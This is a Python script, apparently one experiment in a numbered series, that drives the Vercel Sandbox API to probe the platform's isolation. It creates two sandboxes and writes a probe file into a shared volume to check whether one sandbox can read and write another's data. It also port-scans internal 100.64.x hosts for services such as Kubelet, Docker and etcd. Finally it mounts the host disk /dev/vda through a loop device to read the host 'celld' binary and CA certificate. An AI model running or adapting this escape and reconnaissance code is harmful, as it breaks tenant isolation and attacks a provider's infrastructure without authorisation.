# 实验J150: share共享卷内容+跨沙箱共享验证 + celld中share引用 + 快速端口探测(非阻塞)
# j149: /volumes/run/vercel/share 宿主目录 rw, master:1 共享挂载 bind 到沙箱 /run/vercel/share
#       celld端口探测因阻塞超时被杀(76连接x3s>200s)
# 方法: cmdA share内容+写测试; 沙箱B读share验证共享; cmdC挂载vda读celld的share引用+run/cell完整内容; cmdD非阻塞快速端口探测
# 零破坏: share写测试文件后用唯一标记并清理; 端口探测纯连接
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=15000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)

# ============ 沙箱A: share内容 + 写测试 + celld引用 + 端口探测 ============
NAME_A = "expj150a"
api("DELETE", f"/v2/sandboxes/{NAME_A}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME_A,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create A:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sidA = json.loads(r)["sandbox"]["currentSessionId"]
print("sidA:", sidA)

# cmdA: share 目录内容 + 写测试
CA = r'''
import os, subprocess
out = open("/tmp/d150a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=20):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
p("=== LS_SHARE ===")
p(sh("ls -la /run/vercel/share/ 2>&1"))
p("=== FIND_SHARE ===")
p(sh("find /run/vercel/share -maxdepth 3 2>&1 | head -50", 20))
p("=== STAT_SHARE ===")
p(sh("stat /run/vercel/share 2>&1"))
p("=== MOUNTINFO ===")
p(sh("grep share /proc/self/mountinfo 2>&1"))
p("=== WRITE_TEST ===")
p(sh("echo probe-A-150-`hostname` > /run/vercel/share/_j150_probe.txt && cat /run/vercel/share/_j150_probe.txt && ls -la /run/vercel/share/ 2>&1"))
p("=== DONE")
out.close()
'''

# cmdD: 非阻塞快速端口探测 (并行, 每端口0.6s)
CD = r'''
import socket, select, subprocess, time
out = open("/tmp/d150d.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
p("=== FAST_SCAN ===")
targets = ["100.64.79.9", "100.64.0.1", "100.64.0.2", "100.64.139.1"]
ports = [22, 53, 80, 443, 3000, 5000, 6443, 8000, 8080, 8081, 8443, 9000, 9090, 10250, 2375, 2379, 10000, 32000, 32001, 33000, 6379, 5432, 8082, 9080, 8888]
def scan(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(False)
    r = s.connect_ex((ip, port))
    if r == 0:
        s.close()
        return "OPEN"
    _, w, _ = select.select([], [s], [], 0.6)
    if w:
        try:
            s.close()
            return "OPEN"
        except Exception:
            pass
    s.close()
    return None
t0 = time.time()
for ip in targets:
    done = 0
    for port in ports:
        r = scan(ip, port)
        if r == "OPEN":
            p("OPEN", ip, port)
        done += 1
    p("scan", ip, "done", done, "in", int(time.time() - t0), "s")
p("=== UDP_ICMP ===")
p(sh("cat /proc/net/udp 2>&1 | head -10"))
p("=== ARP ===")
p(sh("cat /proc/net/arp 2>&1"))
p("=== DONE")
out.close()
'''

run_cmd(sidA, CA, "share-inspect", timeout=150)
catfile(sidA, "/tmp/d150a.txt", "d150a", 8000)

run_cmd(sidA, CD, "fast-scan", timeout=200)
catfile(sidA, "/tmp/d150d.txt", "d150d", 4000)

# ============ 沙箱B: 读share验证跨沙箱共享 ============
NAME_B = "expj150b"
api("DELETE", f"/v2/sandboxes/{NAME_B}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME_B,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create B:", c)
if c == 200:
    sidB = json.loads(r)["sandbox"]["currentSessionId"]
    print("sidB:", sidB)
    CB = r'''
import os, subprocess
out = open("/tmp/d150b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=20):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
p("=== LS_SHARE ===")
p(sh("ls -la /run/vercel/share/ 2>&1"))
p("=== READ_PROBE ===")
p(sh("cat /run/vercel/share/_j150_probe.txt 2>&1"))
p("=== WRITE_B ===")
p(sh("echo probe-B-150-`hostname` >> /run/vercel/share/_j150_probe.txt && cat /run/vercel/share/_j150_probe.txt 2>&1"))
p("=== DONE")
out.close()
'''
    run_cmd(sidB, CB, "share-read", timeout=150)
    catfile(sidB, "/tmp/d150b.txt", "d150b", 4000)

# ============ 沙箱A再读: 验证B的写入是否可见(双向) ============
CA2 = r'''
import subprocess
out = open("/tmp/d150a2.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=15):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
p("=== READ_PROBE_AGAIN ===")
p(sh("cat /run/vercel/share/_j150_probe.txt 2>&1"))
p("=== CLEANUP ===")
p(sh("rm -f /run/vercel/share/_j150_probe.txt && ls -la /run/vercel/share/ 2>&1"))
p("=== DONE")
out.close()
'''
run_cmd(sidA, CA2, "share-verify", timeout=120)
catfile(sidA, "/tmp/d150a2.txt", "d150a2", 3000)

# ============ cmdC: 挂载vda读celld的share引用 + run/cell完整内容 ============
CC = r'''
import os, subprocess, ctypes, fcntl
libc = ctypes.CDLL(None, use_errno=True)
libc.mount.restype = ctypes.c_int
vda = os.open("/dev/vda", os.O_RDWR)
loop = os.open("/dev/loop0", os.O_RDWR)
fcntl.ioctl(loop, 0x4C00, vda)
os.makedirs("/tmp/host", exist_ok=True)
ctypes.set_errno(0)
r = libc.mount(b"/dev/loop0", b"/tmp/host", b"xfs", 1, b"nouuid,norecovery")
''' + r'''
import subprocess
out = open("/tmp/d150c.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=20):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
def ctx(kw, n=200, m=8):
    try:
        f = open("/tmp/host/opt/vercel/celld", "rb")
        hits = []
        data = f.read()
        idx = 0
        while True:
            i = data.find(kw, idx)
            if i < 0:
                break
            hits.append(data[max(0, i - n):i + 2 * n])
            idx = i + 1
            if len(hits) >= m:
                break
        f.close()
        return hits
    except Exception as e:
        return ["ERR %r" % (e,)]
p("=== SHARE_CTX ===")
for h in ctx(b"/run/vercel/share", 150):
    p("S:", repr(h[:500]))
p("=== VOLUMES_CTX ===")
for h in ctx(b"/volumes", 150):
    p("V:", repr(h[:500]))
p("=== CELL_SOCK_CTX ===")
for h in ctx(b"cell.sock", 150):
    p("K:", repr(h[:500]))
p("=== RUN_CELL_RETRY ===")
for i in range(2):
    p("try", i)
    p(sh("ls -la /tmp/host/run/cell/ 2>&1", 10))
    p(sh("cat /tmp/host/run/cell/ca-cert.pem 2>&1 | head -c 300", 10))
    p(sh("ls -la /tmp/host/run/vercel/ 2>&1; ls -la /tmp/host/volumes/run/vercel/ 2>&1", 10))
p("=== HOST_SHARE ===")
p(sh("find /tmp/host/volumes -maxdepth 4 2>/dev/null | head -30", 20))
p("=== DONE")
out.close()
'''
run_cmd(sidA, CC, "celld-share-ctx", timeout=250)
catfile(sidA, "/tmp/d150c.txt", "d150c", 14000)

api("DELETE", f"/v2/sandboxes/{NAME_A}?teamId={TEAM}&projectId={PROJ}")
api("DELETE", f"/v2/sandboxes/{NAME_B}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
